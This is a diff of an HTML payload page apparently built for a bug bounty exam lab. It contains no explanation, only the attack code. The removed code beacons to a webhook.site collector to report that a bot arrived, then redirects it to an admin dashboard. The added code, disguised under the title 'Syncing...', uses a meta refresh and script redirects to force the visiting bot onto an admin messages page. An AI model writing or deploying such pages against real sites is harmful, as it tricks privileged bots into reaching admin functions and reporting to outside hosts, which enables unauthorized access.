@@ -1,19 +1,15 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Audit</title></head>
+<head>
+    <title>Syncing...</title>
+    <meta http-equiv="refresh" content="0;url=https://bugbounty-exam.hashacademy.co/admin/messages/69e7f7b7bee6d6b7c6643306">
+</head>
 <body>
     <script>
-        const webhook = "https://webhook.site/ab7f9788-3a2f-41f5-9c2d-84fb65487cc8";
-        const labUrl = "https://bugbounty-exam.hashacademy.co/admin/dashboard";
-
-        // Step 1: Tell the webhook the bot arrived
-        fetch(webhook + "?status=bot_landed_on_github");
-
-        // Step 2: Force the bot to the dashboard
-        // We use window.location.replace to ensure it doesn't just 'stop'
-        setTimeout(() => {
-            window.location.replace(labUrl);
-        }, 500);
+        // Triple-redundancy redirect
+        const target = "https://bugbounty-exam.hashacademy.co/admin/messages/69e7f7b7bee6d6b7c6643306";
+        window.location.href = target;
+        setTimeout(() => { window.location.replace(target); }, 500);
     </script>
 </body>
 </html>
